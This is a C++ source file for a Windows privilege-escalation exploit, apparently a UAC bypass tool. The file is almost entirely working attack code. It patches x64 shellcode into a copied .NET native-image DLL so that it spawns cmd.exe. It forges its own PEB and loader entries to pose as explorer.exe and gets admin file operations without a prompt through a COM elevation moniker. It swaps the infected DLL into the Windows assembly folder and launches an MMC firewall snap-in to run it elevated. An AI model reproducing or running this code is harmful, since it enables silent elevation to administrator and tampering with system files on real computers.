#include <Windows.h>
#include <Shlwapi.h>
#include <ShlObj.h>
#include <ShObjIdl.h>
#include <iostream>
#include <string>

#pragma region NT Stuff
typedef struct _UNICODE_STRING
{
	unsigned short Length;
	unsigned short MaximumLength;
	long Padding_8;
	wchar_t* Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _CURDIR
{
	struct _UNICODE_STRING DosPath;
	void* Handle;
} CURDIR, * PCURDIR;

typedef struct _STRING
{
	unsigned short Length;
	unsigned short MaximumLength;
	long Padding_94;
	char* Buffer;
} STRING, * PSTRING;

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	unsigned short Flags;
	unsigned short Length;
	unsigned long TimeStamp;
	struct _STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	unsigned long MaximumLength;
	unsigned long Length;
	unsigned long Flags;
	unsigned long DebugFlags;
	void* ConsoleHandle;
	unsigned long ConsoleFlags;
	long Padding_95;
	void* StandardInput;
	void* StandardOutput;
	void* StandardError;
	struct _CURDIR CurrentDirectory;
	struct _UNICODE_STRING DllPath;
	struct _UNICODE_STRING ImagePathName;
	struct _UNICODE_STRING CommandLine;
	void* Environment;
	unsigned long StartingX;
	unsigned long StartingY;
	unsigned long CountX;
	unsigned long CountY;
	unsigned long CountCharsX;
	unsigned long CountCharsY;
	unsigned long FillAttribute;
	unsigned long WindowFlags;
	unsigned long ShowWindowFlags;
	long Padding_96;
	struct _UNICODE_STRING WindowTitle;
	struct _UNICODE_STRING DesktopInfo;
	struct _UNICODE_STRING ShellInfo;
	struct _UNICODE_STRING RuntimeData;
	struct _RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];
	unsigned __int64 EnvironmentSize;
	unsigned __int64 EnvironmentVersion;
	void* PackageDependencyData;
	unsigned long ProcessGroupId;
	unsigned long LoaderThreads;
	struct _UNICODE_STRING RedirectionDllName;
	struct _UNICODE_STRING HeapPartitionName;
	unsigned __int64* DefaultThreadpoolCpuSetMasks;
	unsigned long DefaultThreadpoolCpuSetMaskCount;
	long __PADDING__[1];
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

constexpr auto PEB_OFFSET = 0x60ULL;
constexpr auto PROCESS_PARAM_OFFSET = 0x20ULL;
constexpr auto BASENAME_OFFSET = 0x58ULL;
constexpr auto FULLNAME_OFFSET = 0x48ULL;
constexpr auto DLL_BASE_OFFSET = 0x30ULL;
#pragma endregion

using RtlInitUnicodeStringPtr = void(NTAPI*)(PUNICODE_STRING, PCWSTR);
using LDR_ENUM_CALLBACK = void(NTAPI*)(PVOID, PVOID, PBOOLEAN);
using LdrEnumerateLoadedModulesPtr = NTSTATUS(NTAPI*)(ULONG, LDR_ENUM_CALLBACK, PVOID);

struct LDR_CALLBACK_PARAMS
{
	PCWCHAR ExplorerPath;
	PVOID ImageBase;
	RtlInitUnicodeStringPtr RtlInitUnicodeString;
};

const BYTE SHELL_CODE[] = {
			   0x80, 0xFA, 0x01, 0x0F, 0x85, 0xA1, 0x00, 0x00, 0x00, 0x57, 0x48, 0x81, 0xEC, 0xE0, 0x00, 0x00, 0x00,
			   0x48, 0x8D, 0x44, 0x24, 0x70, 0x48, 0x89, 0xC7, 0x31, 0xC0, 0xB9, 0x68, 0x00, 0x00, 0x00, 0xF3, 0xAA,
			   0xC7, 0x44, 0x24, 0x70, 0x68, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x50, 0x48, 0x89, 0x44, 0x24,
			   0x48, 0x48, 0x8D, 0x44, 0x24, 0x70, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0xC7, 0x44, 0x24, 0x38, 0x00,
			   0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x00,
			   0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x45, 0x31, 0xC9, 0x45, 0x31, 0xC0,
			   0x31, 0xD2, 0x48, 0x8D, 0x0D, 0x41, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00,
			   0x00, 0x48, 0x83, 0xC0, 0x60, 0x48, 0x8B, 0x00, 0x48, 0x83, 0xC0, 0x18, 0x48, 0x8B, 0x00, 0x48, 0x8B,
			   0x40, 0x10, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x40, 0x30, 0x4D, 0x31, 0xE4, 0x41, 0xBC,
			   0xEF, 0xBE, 0xAD, 0xDE, 0x4C, 0x01, 0xE0, 0xFF, 0xD0, 0x48, 0x81, 0xC4, 0xE0, 0x00, 0x00, 0x00, 0x5F,
			   0x48, 0x31, 0xC0, 0xB0, 0x01, 0xC3
};

void CreateElevatedCopyObject(IFileOperation** fileOperation)
{
	std::wstring command{ L"Elevation:Administrator!new:" };
	WCHAR clsid[40];
	BIND_OPTS3 bind;

	if (!StringFromGUID2(CLSID_FileOperation, clsid, sizeof clsid / sizeof(WCHAR)))
	{
		*fileOperation = nullptr;
		std::cout << "Cannot create CLSID string\n";
		return;
	}

	command += clsid;

	ZeroMemory(&bind, sizeof(BIND_OPTS3));
	bind.cbStruct = sizeof(BIND_OPTS3);
	bind.dwClassContext = CLSCTX_LOCAL_SERVER;

	const auto result = CoGetObject(command.c_str(), &bind, IID_IFileOperation, reinterpret_cast<void**>(fileOperation));
	if (FAILED(result))
		std::cout << "CoGetObject() failed. HRESULT: 0x" << std::hex << result << std::endl;
}

void ForgeProcessInformation(const PCWCHAR explorerPath, const RtlInitUnicodeStringPtr RtlInitUnicodeString,
	const LdrEnumerateLoadedModulesPtr LdrEnumerateLoadedModules)
{
	const auto pPeb = *reinterpret_cast<PBYTE*>(reinterpret_cast<PBYTE>(NtCurrentTeb()) + PEB_OFFSET);
	auto pProcessParams = *reinterpret_cast<PRTL_USER_PROCESS_PARAMETERS*>(pPeb + PROCESS_PARAM_OFFSET);

	RtlInitUnicodeString(&pProcessParams->ImagePathName, explorerPath);
	RtlInitUnicodeString(&pProcessParams->CommandLine, L"explorer.exe");

	LDR_CALLBACK_PARAMS params{ explorerPath, GetModuleHandleW(nullptr), RtlInitUnicodeString };

	LdrEnumerateLoadedModules(0, [](PVOID ldrEntry, PVOID context, PBOOLEAN stop)
		{
			auto* params = static_cast<LDR_CALLBACK_PARAMS*>(context);

			if (*reinterpret_cast<PULONG_PTR>(reinterpret_cast<ULONG_PTR>(ldrEntry) + DLL_BASE_OFFSET) == reinterpret_cast<
				ULONG_PTR>(params->ImageBase))
			{
				const auto baseName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + BASENAME_OFFSET),
					fullName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + FULLNAME_OFFSET);

				params->RtlInitUnicodeString(baseName, L"explorer.exe");
				params->RtlInitUnicodeString(fullName, params->ExplorerPath);

				*stop = TRUE;
			}
		}, reinterpret_cast<PVOID>(&params));
}

int ChildMain(const PWCHAR commandLine)
{
	PWSTR path;
	if (FAILED(SHGetKnownFolderPath(FOLDERID_Windows, 0, nullptr, &path)))
		return EXIT_FAILURE;

	std::wstring explorer{ path };
	explorer += L"\\explorer.exe";
	CoTaskMemFree(path);

	SHELLSTATEW shellState;
	shellState.fNoConfirmRecycle = TRUE;
	SHGetSetSettings(&shellState, SSF_NOCONFIRMRECYCLE, TRUE);

	ForgeProcessInformation(explorer.c_str(),
		reinterpret_cast<RtlInitUnicodeStringPtr>(
			GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString")),
		reinterpret_cast<LdrEnumerateLoadedModulesPtr>(GetProcAddress(
			GetModuleHandleW(L"ntdll.dll"), "LdrEnumerateLoadedModules")));

	if (FAILED(CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE | COINIT_SPEED_OVER_MEMORY)))
		return EXIT_FAILURE;

	IFileOperation* fileOperation;
	CreateElevatedCopyObject(&fileOperation);
	if (!fileOperation)
	{
		CoUninitialize();
		return EXIT_FAILURE;
	}

	IShellItem* item;
	if (FAILED(SHCreateItemFromParsingName(commandLine + 7, nullptr, IID_IShellItem, reinterpret_cast<void**>(&item))))
	{
		fileOperation->Release();
		CoUninitialize();
		return EXIT_FAILURE;
	}
	if (FAILED(fileOperation->DeleteItem(item, nullptr)))
	{
		item->Release();
		fileOperation->Release();
		CoUninitialize();
		return EXIT_FAILURE;
	}
	if (FAILED(fileOperation->PerformOperations()))
	{
		item->Release();
		fileOperation->Release();
		CoUninitialize();
		return EXIT_FAILURE;
	}

	item->Release();
	fileOperation->Release();
	CoUninitialize();

	return 0;
}

int wmain(int, wchar_t* argv[])
{
	if (wcscmp(argv[0], L"delete") == 0)
		return ChildMain(argv[0]);
	if (wcscmp(argv[0], L"launch") == 0)
	{
		if (reinterpret_cast<int>(ShellExecuteW(nullptr, L"open", L"mmc.exe", L"WF.msc", nullptr, SW_HIDE)) <= 32)
			return EXIT_FAILURE;

		return 0;
	}

	/* Locals */
	PWSTR path, systemPath;
	HRESULT result;
	std::wstring fullPath, cmdPath, explorer, fusionIni;
	WIN32_FIND_DATAW findData;
	HANDLE findHandle, fileHandle, mapping;
	PVOID pTargetFile;
	PIMAGE_NT_HEADERS headers;
	PIMAGE_SECTION_HEADER section;
	PBYTE zeroBlock;
	RtlInitUnicodeStringPtr RtlInitUnicodeString;
	LdrEnumerateLoadedModulesPtr LdrEnumerateLoadedModules;
	IFileOperation* fileOperation;
	LSTATUS status;
	DWORD openResult;
	HKEY userKey;
	IShellItem* assemblyFolder, * dummyFile;
	ULONG_PTR requiredSize;
	PWCHAR currentDirectory;
	IShellItem* existingFile, * targetFile, * targetFolder;
	STARTUPINFOW startupInfo{ sizeof STARTUPINFOW, nullptr };
	PROCESS_INFORMATION processInfo;
	std::wstring launchCmd{ L"delete " };
	DWORD exitCode;

	/*
	 *	STAGE 1
	 *	Find the target DLL file's path.
	 */

	result = SHGetKnownFolderPath(FOLDERID_Windows, 0, nullptr, &path);
	if (FAILED(result))
	{
		std::cout << "SHGetKnownFolderPath() (0) failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}
	result = SHGetKnownFolderPath(FOLDERID_System, 0, nullptr, &systemPath);
	if (FAILED(result))
	{
		std::cout << "SHGetKnownFolderPath() (1) failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}

	fullPath = path;
	cmdPath = systemPath;
	explorer = path;
	fusionIni = path;
	fullPath += L"\\assembly\\NativeImages_v4.0.30319_64\\Accessibility\\*.*";
	cmdPath += L"\\cmd.exe";
	explorer += L"\\explorer.exe";
	fusionIni += L"\\assembly\\Desktop.ini";
	CoTaskMemFree(path);
	CoTaskMemFree(systemPath);

tryagain:
	findHandle = FindFirstFileW(fullPath.c_str(), &findData);
	if (findHandle == INVALID_HANDLE_VALUE)
	{
		if (fullPath.find(L"\\assembly\\NativeImages_v4.0.30319_64\\Accessibility\\*.*") != std::string::npos)
		{
			fullPath = fullPath.substr(0, fullPath.find(L"\\assembly\\NativeImages_v4.0.30319_64\\Accessibility\\*.*"));
			fullPath += L"\\assembly\\NativeImages_v2.0.50727_64\\Accessibility\\*.*";
			goto tryagain;
		}
		std::cout << "FindFirstFileW() failed. Last error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	for (auto i = 0; i != 2; ++i)
	{
		if (!FindNextFileW(findHandle, &findData))
		{
			if (GetLastError() == ERROR_NO_MORE_FILES)
				std::wcout << "No token folder exists under " << fullPath.c_str() << std::endl;
			else
				std::cout << "FindNextFileW() failed. Error: " << GetLastError() << std::endl;

			FindClose(findHandle);
			return EXIT_FAILURE;
		}
	}

	fullPath.pop_back();
	fullPath.pop_back();
	fullPath.pop_back();
	fullPath += findData.cFileName;
	fullPath += L"\\Accessibility.ni.dll";

	FindClose(findHandle);

	/*
	 *	END STAGE 1
	 */

	 /*
	  *	STAGE 2
	  *	Copy the target dll, infect it and save it as "infect.dll".
	  */

	if (!CopyFileW(fullPath.c_str(), L"infect.dll", FALSE))
	{
		std::wcout << L"Failed to copy " << fullPath.c_str() << L" to the current directory. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	fileHandle = CreateFileW(L"infect.dll", FILE_READ_ACCESS | FILE_WRITE_ACCESS, 0, nullptr, OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL, nullptr);
	if (fileHandle == INVALID_HANDLE_VALUE)
	{
		std::cout << "Failed to open 'infect.dll'. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	mapping = CreateFileMappingW(fileHandle, nullptr, PAGE_READWRITE, 0, 0, nullptr);
	if (!mapping)
	{
		CloseHandle(fileHandle);
		std::cout << "CreateFileMapping() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	pTargetFile = MapViewOfFile(mapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	if (!pTargetFile)
	{
		CloseHandle(mapping);
		CloseHandle(fileHandle);
		std::cout << "MapViewOfFile() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	headers = reinterpret_cast<PIMAGE_NT_HEADERS>(static_cast<PBYTE>(pTargetFile) + static_cast<
		PIMAGE_DOS_HEADER>(pTargetFile)->e_lfanew);

	section = IMAGE_FIRST_SECTION(headers);
	while (std::strcmp(".text", reinterpret_cast<char const*>(section->Name)))
		++section;

	zeroBlock = static_cast<PBYTE>(pTargetFile) + section->PointerToRawData;

	for (; ++zeroBlock;)
	{
		auto fail = false;
		for (auto* z = zeroBlock; z != zeroBlock + sizeof SHELL_CODE + (cmdPath.size() * 2) + sizeof(L'\0'); ++z)
		{
			if (*z)
			{
				fail = true;
				break;
			}
		}
		if (!fail)
			break;
	}

	memcpy(zeroBlock, SHELL_CODE, sizeof SHELL_CODE);
	memcpy(zeroBlock + sizeof SHELL_CODE, cmdPath.c_str(), (cmdPath.size() * 2) + sizeof(L'\0'));

	*reinterpret_cast<PDWORD>(zeroBlock + 0x99) = static_cast<DWORD>(reinterpret_cast<PBYTE>(CreateProcessW) -
		reinterpret_cast<PBYTE>(GetModuleHandleW(L"kernel32.dll")));

	auto offset = static_cast<DWORD>(zeroBlock - static_cast<PBYTE>(pTargetFile));
	offset -= section->PointerToRawData;
	offset += section->VirtualAddress;
	headers->OptionalHeader.AddressOfEntryPoint = offset;

	if (!FlushViewOfFile(pTargetFile, 0))
	{
		UnmapViewOfFile(pTargetFile);
		CloseHandle(mapping);
		CloseHandle(fileHandle);
		std::cout << "FlushViewOfFile() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	UnmapViewOfFile(pTargetFile);
	CloseHandle(mapping);
	CloseHandle(fileHandle);

	/*
	 *	END STAGE 2
	 */

	 /*
	  *	STAGE 3
	  *	Forge process information to allow IFileOperation as Administrator w/o UAC prompt.
	  */

	RtlInitUnicodeString = reinterpret_cast<RtlInitUnicodeStringPtr>(GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString"));
	LdrEnumerateLoadedModules = reinterpret_cast<LdrEnumerateLoadedModulesPtr>(GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), "LdrEnumerateLoadedModules"));

	ForgeProcessInformation(explorer.c_str(), RtlInitUnicodeString, LdrEnumerateLoadedModules);

	result = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE | COINIT_SPEED_OVER_MEMORY);
	if (FAILED(result))
	{
		std::cout << "CoInitializeEx() failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}

	CreateElevatedCopyObject(&fileOperation);
	if (!fileOperation)
	{
		CoUninitialize();
		return EXIT_FAILURE;
	}

	/*
	 *	END STAGE 3
	 */

	 /*
	  *	STAGE 4
	  *	Create a registry key that allows us to bypass the shfusion.dll restriction.
	  *	Only do this if the "desktop.ini" exists in the folder.
	  */

	if (!PathFileExistsW(fusionIni.c_str()))
		goto DoAttackDirect;

	if ((status = RegCreateKeyExW(
		HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\CLSID\\{1D2680C9-0E2A-469d-B787-065558BC7D43}", 0, nullptr,
		REG_OPTION_NON_VOLATILE, KEY_CREATE_SUB_KEY | KEY_SET_VALUE, nullptr, &userKey, &openResult)))
	{
		fileOperation->Release();
		CoUninitialize();
		std::cout << "RegCreateKeyExW() (0) failed. Error " << status << std::endl;
		return EXIT_FAILURE;
	}
	if ((status = RegSetValueExW(userKey, nullptr, 0, REG_SZ, reinterpret_cast<const BYTE*>(L""), sizeof(L""))))
	{
		fileOperation->Release();
		RegCloseKey(userKey);
		CoUninitialize();
		std::cout << "RegSetValueExW() (0) failed. Error " << status << std::endl;
		return EXIT_FAILURE;
	}
	if ((status = RegCreateKeyExW(userKey, L"Server", 0, nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr,
		&userKey,
		&openResult)))
	{
		fileOperation->Release();
		RegCloseKey(userKey);
		CoUninitialize();
		std::cout << "RegCreateKeyExW() (1) failed. Error " << status << std::endl;
		return EXIT_FAILURE;
	}
	if ((status = RegSetValueExW(userKey, nullptr, 0, REG_SZ, reinterpret_cast<const BYTE*>(L""), sizeof(L""))))
	{
		fileOperation->Release();
		RegCloseKey(userKey);
		CoUninitialize();
		std::cout << "RegSetValueExW() (1) failed. Error " << status << std::endl;
		return EXIT_FAILURE;
	}

	RegCloseKey(userKey);

	/*
	 *	END STAGE 4
	 */

	 /*
	  *	BEGIN STAGE 5
	  *	Force copy new Desktop.ini into assembly folder to disable shfusion.dll via IFileOperation bug.
	  */

	CreateDirectoryW(L"byeinteg_files", nullptr);

	CloseHandle(CreateFileW(L"byeinteg_files\\Desktop.ini", FILE_WRITE_ACCESS, 0, nullptr, CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, nullptr));
	explorer = explorer.substr(0, explorer.find(L"explorer.exe"));
	explorer += L"assembly";

	result = SHCreateItemFromParsingName(explorer.c_str(), nullptr, IID_IShellItem, reinterpret_cast<void**>(&assemblyFolder));
	if (FAILED(result))
	{
		fileOperation->Release();
		CoUninitialize();
		std::cout << "SHCreateItemFromParsingName() (0) failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}

	requiredSize = static_cast<ULONG_PTR>(GetCurrentDirectoryW(0, nullptr));
	currentDirectory = new WCHAR[requiredSize + 27];
	GetCurrentDirectoryW(static_cast<DWORD>(requiredSize), currentDirectory);
	wcscat_s(currentDirectory, requiredSize + 27, L"\\byeinteg_files\\Desktop.ini");

	result = SHCreateItemFromParsingName(currentDirectory, nullptr, IID_IShellItem, reinterpret_cast<void**>(&dummyFile));
	delete[] currentDirectory;
	if (FAILED(result))
	{
		assemblyFolder->Release();
		fileOperation->Release();
		CoUninitialize();
		std::cout << "SHCreateItemFromParsingName() (1) failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}

	result = fileOperation->SetOperationFlags(FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION | FOF_NOERRORUI);
	if (FAILED(result))
	{
		dummyFile->Release();
		assemblyFolder->Release();
		fileOperation->Release();
		CoUninitialize();
		std::cout << "IFileOperation::SetOperationFlags() failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}
	result = fileOperation->CopyItem(dummyFile, assemblyFolder, nullptr, nullptr);
	if (FAILED(result))
	{
		assemblyFolder->Release();
		dummyFile->Release();
		fileOperation->Release();
		CoUninitialize();
		std::cout << "IFileOperation::CopyItem() failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}
	result = fileOperation->PerformOperations();
	if (FAILED(result))
	{
		assemblyFolder->Release();
		dummyFile->Release();
		fileOperation->Release();
		CoUninitialize();
		std::cout << "IFileOperation::PerformOperations() (0) failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}

	assemblyFolder->Release();
	dummyFile->Release();

	/*
	 *	END STAGE 5
	 */

	 /*
	  *	BEGIN STAGE 6
	  *	Undo changes to the registry so we can browse the assembly folder completely normally.
	  *	Also delete the dummy Desktop.ini we copied over there.
	  */

	if ((status = RegCreateKeyExW(
		HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\CLSID\\{1D2680C9-0E2A-469d-B787-065558BC7D43}", 0, nullptr,
		REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &userKey, &openResult)))
	{
		fileOperation->Release();
		CoUninitialize();
		std::cout << "RegCreateKeyExW() (2) failed. Error " << status << std::endl;
		return EXIT_FAILURE;
	}
	if ((status = RegDeleteKeyExW(userKey, L"Server", KEY_WOW64_64KEY, 0)))
	{
		RegCloseKey(userKey);
		fileOperation->Release();
		CoUninitialize();
		std::cout << "RegDeleteKeyExW() (0) failed. Error " << status << std::endl;
		return EXIT_FAILURE;
	}
	RegCloseKey(userKey);
	if ((status = RegDeleteKeyExW(
		HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\CLSID\\{1D2680C9-0E2A-469d-B787-065558BC7D43}", KEY_WOW64_64KEY, 0)))
	{
		fileOperation->Release();
		CoUninitialize();
		std::cout << "RegDeleteKeyExW() (1) failed. Error " << status << std::endl;
		return EXIT_FAILURE;
	}

	// Launch the delete process

	explorer += L"\\Desktop.ini";
	launchCmd += explorer;
	if (!CreateProcessW(argv[0], const_cast<LPWSTR>(launchCmd.c_str()), nullptr, nullptr, FALSE, 0, nullptr, nullptr,
		&startupInfo, &processInfo))
	{
		fileOperation->Release();
		CoUninitialize();
		std::cout << "CreateProcessW() (0) failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	WaitForSingleObject(processInfo.hProcess, INFINITE);
	GetExitCodeProcess(processInfo.hProcess, &exitCode);
	CloseHandle(processInfo.hThread);
	CloseHandle(processInfo.hProcess);

	if (exitCode)
	{
		fileOperation->Release();
		CoUninitialize();
		std::cout << "The child process failed to delete the target file.\n";
		return EXIT_FAILURE;
	}

	/*
	 *	END STAGE 6
	 */

	 /*
	  *	STAGE 7
	  *	Delete the original Accessibility.ni.dll file and move our inject.dll file with the correct name over there.
	  */

DoAttackDirect:
	result = SHCreateItemFromParsingName(fullPath.c_str(), nullptr, IID_IShellItem,
		reinterpret_cast<void**>(&existingFile));
	if (FAILED(result))
	{
		fileOperation->Release();
		CoUninitialize();
		std::cout << "SHCreateItemFromParsingName() (2) failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}
	fullPath = fullPath.substr(0, fullPath.size() - std::wcslen(L"Accessibility.ni.dll"));
	result = SHCreateItemFromParsingName(fullPath.c_str(), nullptr, IID_IShellItem, reinterpret_cast<void**>(&targetFolder));
	if (FAILED(result))
	{
		existingFile->Release();
		fileOperation->Release();
		CoUninitialize();
		std::cout << "SHCreateItemFromParsingName() (3) failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}

	requiredSize = static_cast<ULONG_PTR>(GetCurrentDirectoryW(0, nullptr));
	currentDirectory = new WCHAR[requiredSize + 11];
	GetCurrentDirectoryW(static_cast<DWORD>(requiredSize), currentDirectory);

	wcscat_s(currentDirectory, requiredSize + 11, L"\\infect.dll");
	result = SHCreateItemFromParsingName(currentDirectory, nullptr, IID_IShellItem,
		reinterpret_cast<void**>(&targetFile));
	if (FAILED(result))
	{
		delete[] currentDirectory;
		targetFolder->Release();
		existingFile->Release();
		fileOperation->Release();
		CoUninitialize();
		std::cout << "SHCreateItemFromParsingName() (4) failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}

	delete[] currentDirectory;

	result = fileOperation->RenameItem(existingFile, L"Accessibility.ni.dll.bak", nullptr);
	if (FAILED(result))
	{
		targetFile->Release();
		targetFolder->Release();
		existingFile->Release();
		fileOperation->Release();
		CoUninitialize();
		std::cout << "IFileOperation::RenameItem() failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}
	result = fileOperation->MoveItem(targetFile, targetFolder, L"Accessibility.ni.dll", nullptr);
	if (FAILED(result))
	{
		targetFile->Release();
		targetFolder->Release();
		existingFile->Release();
		fileOperation->Release();
		CoUninitialize();
		std::cout << "IFileOperation::MoveItem() failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}
	result = fileOperation->PerformOperations();
	if (FAILED(result))
	{
		targetFile->Release();
		targetFolder->Release();
		existingFile->Release();
		fileOperation->Release();
		CoUninitialize();
		std::cout << "IFileOperation::PerformOperations() (1) failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}

	targetFile->Release();
	targetFolder->Release();
	existingFile->Release();
	fileOperation->Release();
	CoUninitialize();

	/*
	 *	END STAGE 7
	 */

	 /*
	  *	STAGE 8
	  *	Launch the Firewall Snap-in via WF.msc to execute the exploit and do the attack.
	  *	Also delete infect.dll and the dummy Desktop.ini file.
	  */

	  /* Launch the launch process. This is for Windows 7, because it seems like messing with the PEB causes
	   * ShellExecute(Ex) to run out of memory. Makes no sense at all but that's how it is. */

	DeleteFileW(L"infect.dll");
	DeleteFileW(L"byeinteg_files\\Desktop.ini");
	RemoveDirectoryW(L"byeinteg_files");
	if (!CreateProcessW(argv[0], const_cast<LPWSTR>(L"launch"), nullptr, nullptr, FALSE, 0, nullptr, nullptr,
		&startupInfo, &processInfo))
	{
		std::cout << "CreateProcessW() (1) Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	WaitForSingleObject(processInfo.hProcess, INFINITE);
	GetExitCodeProcess(processInfo.hProcess, &exitCode);
	CloseHandle(processInfo.hProcess);
	CloseHandle(processInfo.hThread);

	if (exitCode)
	{
		std::cout << "The child process failed to launch mmc.exe\n";
		return EXIT_FAILURE;
	}

	/*
	 *	END STAGE 8
	 */

	 // Finally, we can print success and exit.

	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 15);

	std::cout << "[+] ";

	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);

	std::cout << "*** Exploit successful.\n\n";

	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);

	return 0;
}